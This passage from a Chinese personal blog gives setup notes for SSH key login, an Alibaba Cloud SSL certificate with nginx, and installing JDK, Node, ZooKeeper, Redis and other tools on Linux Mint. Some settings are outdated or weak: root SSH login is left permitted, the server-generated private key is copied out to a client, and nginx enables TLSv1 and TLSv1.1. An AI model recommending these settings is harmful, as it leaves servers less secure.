<p>添加如下设置：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>RSAAuthentication yes
</span></span><span style="display:flex;"><span>PubkeyAuthentication yes
</span></span></code></pre></td></tr></table>
</div>
</div><p>请留意 root 用户能否通过 SSH 登录：
<code>PermitRootLogin yes</code></p>
<p>当你完成全部设置，并以密钥方式登录成功后，可以禁用密码登录：
<code>PasswordAuthentication no</code></p>
<p>最后，重启 SSH 服务：
<code>service sshd restart</code></p>
<h2 id="复制私钥id_rsa到本地">复制私钥<code>id_rsa</code>到本地<a hidden class="anchor" aria-hidden="true" href="#复制私钥id_rsa到本地">#</a></h2>
<p>私钥的位置在：<code>/root/.ssh/id_rsa</code>
用vim打开id_rsa，复制内容，在本地合适的位置创建id_rsa文件，黏贴。</p>
<h2 id="登录">登录<a hidden class="anchor" aria-hidden="true" href="#登录">#</a></h2>
<p>本机ssh登录的时候，选择公钥方式登录，然后选择<code>id_rsa</code>文件。</p>
<h2 id="问题">问题<a hidden class="anchor" aria-hidden="true" href="#问题">#</a></h2>
<p>用私钥登录，提示：<code>WARNING: UNPROTECTED PRIVATE KEY FILE!</code>
意思是说我的私钥权限太宽了（too open），需要限制。
linux，用chomd命令就可以解决：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cd .ssh
</span></span><span style="display:flex;"><span>chmod 700 id_rsa
</span></span></code></pre></td></tr></table>
</div>
</div><p>但是我的电脑是windows环境，不能用上面的命令。
找到密钥文件<code>id_rsa</code>，修改它的权限。
右键 属性-&gt;安全-&gt;高级-&gt;点击禁用继承-&gt;从此对象中删除所有已继承的权限。
然后点击添加-&gt;选择主体，输入电脑用户名（就是你开机的时候那个账户名），然后一路确定就可以了。上面的操作是仅仅让文件所有者（电脑开机的那个账户）拥有对文件的所有权限，其他的人并没有权限。</p>
<p><a href="https://www.cnblogs.com/hmII/p/10245697.html">参考</a></p>
<h1 id="阿里云升级https">阿里云升级https<a hidden class="anchor" aria-hidden="true" href="#阿里云升级https">#</a></h1>
<h2 id="申请证书">申请证书<a hidden class="anchor" aria-hidden="true" href="#申请证书">#</a></h2>
<p>登录阿里云-&gt;控制台-&gt;产品与服务-&gt;安全（云盾）-&gt;SSL证书(应用安全)-&gt;购买证书-&gt;免费型DV SSL-&gt;购买并支付(这里支付0.00，就是不用花钱)
然后回到控制台-&gt;SSL证书(应用安全)，可以看到刚才购买的免费SSL证书。</p>
<ul>
<li>
<p>点击右侧的证书申请，填写申请人的详细信息，然后点击下一步，进入证书验证信息页面。在这个界面可以看到三个值：记录类型、主机记录和记录值。</p>
</li>
<li>
<p>找到你的域名供应商控制台，我的是腾讯云，进入控制台，在左上角<code>云产品</code>的下拉列表搜索<code>云解析</code>，进入会看到你的域名，点击右侧的解析，点击左上角的<code>添加记录</code></p>
</li>
<li>
<p>根据提示分别填入上边的三个信息，然后确认保存，解析记录添加成功。</p>
</li>
<li>
<p>回到阿里云，点击验证，成功会提示：已经成功提交到CA公司，请您保持电话畅通，并及时查阅邮箱中来自CA公司的电子邮件。</p>
</li>
<li>
<p>安静的等待审核通过，一般十分钟就通过了，审核通过后会在ssl证书页面看到证书的状态是<code>已签发</code>。</p>
</li>
<li>
<p>点击右侧的下载，根据自己的服务器类型选择证书下载，我下载nginx版本，顺便打开帮助文档，<a href="https://help.aliyun.com/knowledge_detail/95491.html">按照文档来</a>。</p>
</li>
<li>
<p>在Nginx的安装目录下创建cert目录，并且将下载的全部文件拷贝到cert目录中，注意这里先解压再上传到服务器，应该是两个文件，分别是.key和.pem结尾的。</p>
</li>
<li>
<p>打开<code>nginx.conf</code>配置文件，做如下配置：</p>
</li>
</ul>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>server {
</span></span><span style="display:flex;"><span>	listen 80 default backlog=2048;
</span></span><span style="display:flex;"><span>	listen       443 ssl;
</span></span><span style="display:flex;"><span>	server_name  api.zjxk12.com;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	# ssl开头的都是证书配置
</span></span><span style="display:flex;"><span>	ssl_certificate      /usr/local/nginx/cert/api.zjxk12.com.pem;
</span></span><span style="display:flex;"><span>	ssl_certificate_key  /usr/local/nginx/cert/api.zjxk12.com.key;
</span></span><span style="display:flex;"><span>	ssl_session_cache    shared:SSL:1m;
</span></span><span style="display:flex;"><span>	ssl_session_timeout  5m;
</span></span><span style="display:flex;"><span>	ssl_ciphers  ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
</span></span><span style="display:flex;"><span>	ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
</span></span><span style="display:flex;"><span>	ssl_prefer_server_ciphers  on;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	# 端口转发
</span></span><span style="display:flex;"><span>	location / {
</span></span><span style="display:flex;"><span>		proxy_pass http://api.zjxk12.com:8000;
</span></span><span style="display:flex;"><span>		index  index.html index.htm;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	location ~.txt{
</span></span><span style="display:flex;"><span>		root /usr/local/src;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	error_page   500 502 503 504  /50x.html;
</span></span><span style="display:flex;"><span>	location = /50x.html {
</span></span><span style="display:flex;"><span>		root   html;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ssl开头的都是证书配置，要按照规定写，其他参数根据自己需求填写。
填完之后启动nginx报错：
<code>nginx: [emerg] the &quot;ssl&quot; parameter requires ngx_http_ssl_module in /usr/local/nginx/conf/nginx.conf:105</code>
原因也很简单，nginx缺少http_ssl_module模块，编译安装的时候带上&ndash;with-http_ssl_module配置就行了，但是现在的情况是我的nginx已经安装过了，怎么添加模块，其实也很简单，往下看： 做个说明：我的nginx的安装目录是/usr/local/nginx这个目录，我的源码包在/usr/local/src/nginx-1.6.2目录</p>
<p>Nginx开启SSL模块
切换到源码包：
<code>cd /usr/local/src/nginx-1.11.3</code>
查看nginx原有的模块
<code>/usr/local/nginx/sbin/nginx -V</code>
在configure arguments:后面显示的原有的configure参数如下：
<code>--prefix=/usr/local/nginx --with-http_stub_status_module</code>
那么我们的新配置信息就应该这样写：
<code>./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module</code>
报错：<code>./configure: error: SSL modules require the OpenSSL library.</code>
那就安装它：
<code>yum -y install openssl openssl-devel</code>
然后继续执行上边的命令，就成功了。</p>
<p>上面的命令运行完，再执行：
<code>make</code>
这里不要进行make install，否则就是覆盖安装
然后备份原有已安装好的nginx
<code>cp /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.bak</code></p>
<p>停止nginx，先找到进程号：
<code>netstat -nltp|grep 80</code>
<code>kill 13589</code></p>
<p>然后将刚刚编译好的nginx覆盖掉原有的nginx（这个时候nginx要停止状态）
<code>cp ./objs/nginx /usr/local/nginx/sbin/</code>
提示：<code>cp overwrite...?</code>
此时输入<code>y</code>，然后回车，直接回车则不执行任何操作。</p>
<p>然后启动nginx，在nginx的sbin目录下执行
<code>./nginx</code></p>
<p>通过命令查看是否已经加入成功
<code>/usr/local/nginx/sbin/nginx -V</code></p>
<p><a href="https://www.cnblogs.com/ghjbk/p/6744131.html">参考地址</a></p>
<h1 id="linuxmint">LinuxMint<a hidden class="anchor" aria-hidden="true" href="#linuxmint">#</a></h1>
<h2 id="gedit">gedit<a hidden class="anchor" aria-hidden="true" href="#gedit">#</a></h2>
<p><code>sudo apt-get install gedit</code>
文件编辑器，比vi、vim好用一些。</p>
<h2 id="jdk">jdk<a hidden class="anchor" aria-hidden="true" href="#jdk">#</a></h2>
<p>首先卸载系统自带的jdk，查看安装的软件包
sudo dpkg &ndash;list | grep -i jdk</p>
<p>删除jdk
sudo apt-get purge openjdk*</p>
<p>删除其他的包
sudo apt-get purge icedtea-* openjdk-*
cd /usr/lib/jvm （如果没有jvm这个目录，就不用管这步了）
sudo rm -rf jdk<version></p>
<p>再次确认是否被删除
sudo dpkg &ndash;list | grep -i jdk</p>
<p><a href="https://www.oracle.com/technetwork/java/javase/downloads/index.html">https://www.oracle.com/technetwork/java/javase/downloads/index.html</a>
下载想要的jdk，下载完成后，解压到/opt目录
<code>sudo tar zxvf jdk.tar.gz -C /opt/</code>
注意将jdk改成自己下载的jdk名字</p>
<p>下面配置环境变量，需要提前安装gedit，如上。
gedit安装好后，<code>sudo gedit /etc/profile</code>
在 profile 文件的后面加上以下语句</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># JAVA Config
</span></span><span style="display:flex;"><span>export JAVA_HOME=/opt/jdk1.8.0_101
</span></span><span style="display:flex;"><span>export JRE_HOME=/opt/jdk1.8.0_101/jre
</span></span><span style="display:flex;"><span>export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH
</span></span><span style="display:flex;"><span>export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意将jdk名字改成自己的。</p>
<p>使文件立即生效
<code>source /etc/profile</code>
在终端输入java -version，看到版本号说明成功。</p>
<h2 id="node">node<a hidden class="anchor" aria-hidden="true" href="#node">#</a></h2>
<p><a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a>
官网下载linux版本的二进制文件
<code>xz -d  node-v8.11.1-linux-x64.tar.xz</code>
上边指令执行完后，文件末尾没有.xz了，然后将文件解压到想要的目录
<code>sudo tar zxvf node_10.15.tar -C /home/wjy/install</code></p>
<p>添加链接，可以全局使用命令
<code>ln -s /root/node-10.15/bin/node /usr/local/bin/node</code>
<code>ln -s /root/node-10.15/bin/npm /usr/local/bin/npm</code></p>
<p>执行完在终端任意目录 输入 node -v，看到版本号说明成功。</p>
<h2 id="snap">snap<a hidden class="anchor" aria-hidden="true" href="#snap">#</a></h2>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt-get install snapd 
</span></span><span style="display:flex;"><span>sudo apt-get install snapcraft 
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>列出已经安装的snap包
<code>sudo snap list</code></p>
</li>
<li>
<p>搜索要安装的snap包
<code>sudo snap find &lt;text to search&gt;</code></p>
</li>
<li>
<p>安装一个snap包
<code>sudo snap install &lt;snap name&gt;</code></p>
</li>
<li>
<p>更新一个snap包，如果你后面不加包的名字的话那就是更新所有的snap包
<code>sudo snap refresh &lt;snap name&gt;</code></p>
</li>
<li>
<p>把一个包还原到以前安装的版本
<code>sudo snap revert &lt;snap name&gt;</code></p>
</li>
<li>
<p>删除一个snap包
<code>sudo snap remove &lt;snap name&gt;</code></p>
</li>
<li>
<p>安装网易云音乐
<code>sudo snap install netease-music --devmode --beta</code></p>
</li>
<li>
<p>安装微信
<code>sudo snap install electronic-wechat</code>
需要重启才能在左下角管理中看到微信</p>
</li>
</ul>
<h2 id="git">git<a hidden class="anchor" aria-hidden="true" href="#git">#</a></h2>
<p>更新linux mint 内核及软件包</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt-get update 
</span></span><span style="display:flex;"><span>sudo apt-get upgrade
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用dpkg包管理器查询是否已安装git
<code>sudo dpkg -l git</code></p>
<p>通过apt-get 安装软件库中最新版本的git</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt-get install git
</span></span></code></pre></td></tr></table>
</div>
</div><p>检查是否安装成功
<code>git --version</code></p>
<h3 id="idea中配置git">idea中配置git<a hidden class="anchor" aria-hidden="true" href="#idea中配置git">#</a></h3>
<p>使用apt-get install 方式安装的软件，
1.下载的软件存放位置
/var/cache/apt/archives</p>
<p>2.安装后软件默认位置
/usr/share</p>
<p>3.可执行文件位置
/usr/bin</p>
<p>4.配置文件位置
/etc</p>
<p>5.lib文件位置
/usr/lib</p>
<p>所以在idea中配置git的可执行文件，选择位置use/bin/git
点击test，显示git版本号，说明成功，就可以从github或coding上拉取代码了。</p>
<h2 id="zookeeper">zookeeper<a hidden class="anchor" aria-hidden="true" href="#zookeeper">#</a></h2>
<p>下载地址：
<a href="http://mirror.bit.edu.cn/apache/zookeeper/">http://mirror.bit.edu.cn/apache/zookeeper/</a>
下载stable版本。</p>
<p>将下载好的.gz解压并复制到想要的位置。/home/wjy/install</p>
<p>在zk的根目录创建两个文件夹data和data_log，分别用来存放zk的数据以及日志。然后进入到data目录，使用pwd指令查看并复制data目录的绝对路径。</p>
<p>进入zookeeper的conf目录下，复制zoo_sample.cfg为zoo.cfg
<code>cp zoo_sample.cfg zoo.cfg</code></p>
<p>然后编辑zoo.cfg，修改或新增下面两行配置：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>dataDir=/home/wjy/install/zookeeper-3.4.13/data
</span></span><span style="display:flex;"><span>dataLogDir=/home/wjy/install/zookeeper-3.4.13/data_log
</span></span></code></pre></td></tr></table>
</div>
</div><p>保存并退出。</p>
<p>zoo.cfg只存放了单机的配置，想配置集群需要在最后面加上其他服务器的ip和端口。</p>
<p>到zk的bin目录下启动：
<code>./zkServer.sh start</code></p>
<p>查看状态
<code>./zkServer.sh status</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ZooKeeper JMX enabled by default
</span></span><span style="display:flex;"><span>Using config: /home/wjy/install/zookeeper-3.4.13/bin/../conf/zoo.cfg
</span></span><span style="display:flex;"><span>Mode: standalone
</span></span></code></pre></td></tr></table>
</div>
</div><p>出现上边的状态说明启动成功。
standalone：单机</p>
<h2 id="redis">redis<a hidden class="anchor" aria-hidden="true" href="#redis">#</a></h2>
<p><a href="https://redis.io/">https://redis.io/</a>
官网下载，解压并复制到想要的位置 /home/wjy/install</p>
<p>cd到redis根目录下，执行
<code>make</code>
报错：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>net.c:36:23: fatal error: sys/types.h: No such file or directory(没有那个文件或目录)
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>adlist.c:32:20: fatal error: stdlib.h: No such file or directory
</span></span></code></pre></td></tr></table>
</div>
</div><p>原因是缺少文件，执行以下命令后再次make：
<code>sudo apt-get install libc6-dev</code></p>
<p>还是报错:
<code>zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory</code></p>
<p>原因是libc不是默认的分配器，在make后添加参数解决：
<code>sudo make MALLOC=libc</code></p>
<p>等待执行完成，到redis/src目录下，执行
<code>./redis-server</code>
出现端口号和进程PID，证明启动成功。</p>
<h2 id="postman">postman<a hidden class="anchor" aria-hidden="true" href="#postman">#</a></h2>
<p><a href="https://www.getpostman.com/downloads/">https://www.getpostman.com/downloads/</a>
下载对应版本.gz,并解压到理想位置。</p>
<p>创建全局变量，也就是在任何地方都可以执行postman，不用去到安装目录，执行
<code>sudo ln -s /home/wjy/install/Postman/Postman  /usr/bin/postman</code></p>
<p>添加启动器应用图标，也就是可以从启动器快速启动，执行
<code>vim /usr/share/applications/postman.desktop</code>
填写如下内容：注意修改路径</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[Desktop Entry]
</span></span><span style="display:flex;"><span>Encoding=UTF-8
</span></span><span style="display:flex;"><span>Name=Postman
</span></span><span style="display:flex;"><span>Exec=postman
</span></span><span style="display:flex;"><span>Icon=/home/wjy/install/Postman/resources/app/assets/icon.png
</span></span><span style="display:flex;"><span>Terminal=false
</span></span><span style="display:flex;"><span>Type=Application
</span></span><span style="display:flex;"><span>Categories=Development;
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后就可以在启动器搜索到postman，然后可以将该应用添加到桌面。</p>
<h2 id="navicat">navicat<a hidden class="anchor" aria-hidden="true" href="#navicat">#</a></h2>
<p>官网下载：https://www.navicat.com.cn/download/navicat-premium
直接下载试用版，解压到理想位置。
